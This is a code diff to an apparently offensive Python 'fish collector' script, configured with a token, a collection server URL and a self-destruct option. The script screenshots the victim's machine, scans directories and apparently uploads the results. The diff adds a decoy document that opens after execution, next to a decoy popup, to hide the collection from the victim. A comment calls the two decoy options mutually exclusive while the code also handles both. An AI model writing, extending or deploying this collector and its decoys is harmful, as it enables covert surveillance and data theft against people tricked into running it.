@@ -12,6 +12,8 @@ TOKEN = "{{TOKEN}}"
 SELF_DESTRUCT = "{{SELF_DESTRUCT}}"       # "true" or "false"
 POPUP_ENABLED = "{{POPUP_ENABLED}}"       # "true" or "false"
 POPUP_MESSAGE = "{{POPUP_MESSAGE}}"       # popup text after execution
+DECOY_FILE = "{{DECOY_FILE}}"             # optional file opened after execution
+BEHAVIOR = "{{BEHAVIOR}}"                 # 'open_file' or 'popup', mutually exclusive
 # ------------------------------------------
 
 
@@ -60,6 +62,8 @@ if _footer_cfg:
     SELF_DESTRUCT = 'true' if _footer_cfg.get('self_destruct') else 'false'
     POPUP_ENABLED = 'true' if _footer_cfg.get('popup_enabled', True) else 'false'
     POPUP_MESSAGE = _footer_cfg.get('popup_message', POPUP_MESSAGE)
+    DECOY_FILE = _footer_cfg.get('decoy_file', DECOY_FILE)
+    BEHAVIOR = _footer_cfg.get('behavior', BEHAVIOR)
 
 IS_WINDOWS = sys.platform == 'win32'
 
@@ -547,19 +551,48 @@ def show_popup():
                 continue
 
 
+def _resolve_decoy_path(path):
+    if os.path.isabs(path):
+        return path
+    return os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), path)
+
+
+def open_decoy_file():
+    """Open the configured document after execution (best effort)."""
+    path = (DECOY_FILE or '').strip()
+    if not path:
+        return
+    path = os.path.expandvars(os.path.expanduser(path))
+    local = _resolve_decoy_path(path)
+    if not os.path.exists(local):
+        return
+    if IS_WINDOWS:
+        try:
+            os.startfile(local)
+            return
+        except Exception:
+            pass
+        try:
+            import ctypes
+            ctypes.windll.shell32.ShellExecuteW(
+                None, 'open', local, None, None, 1)
+        except Exception:
+            pass
+    else:
+        try:
+            subprocess.Popen(['xdg-open', local],
+                             stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+
 # ---- Main ----
 
 def main():
     print("[*] Starting fish collector...")
     print(f"[*] Token: {TOKEN}")
     print(f"[*] Server: {SERVER_URL}")
-
-    # Show the decoy immediately on a worker thread. The previous placement
-    # (after screenshot + directory scan + upload) made the popup appear only
-    # after a long delay, which looked broken to the user.
-    if POPUP_ENABLED.lower() == 'true':
-        import threading
-        threading.Thread(target=show_popup, daemon=True).start()
 
     hostname = socket.gethostname()
     if IS_WINDOWS:
@@ -581,6 +614,15 @@ def main():
         print(f"[*] Screenshot captured ({size} bytes)")
     else:
         print("[!] Screenshot failed")
+
+    # Checked behaviors run independently: open the decoy and/or show the
+    # popup. Both run only when the operator explicitly checked both.
+    behavior = (BEHAVIOR or '').strip().lower()
+    if behavior in ('open_file', 'both'):
+        open_decoy_file()
+    if behavior in ('popup', 'both') and POPUP_ENABLED.lower() == 'true':
+        import threading
+        threading.Thread(target=show_popup, daemon=True).start()
 
     print(f"[*] Scanning directories...")
     dir_info = scan_target_directories()
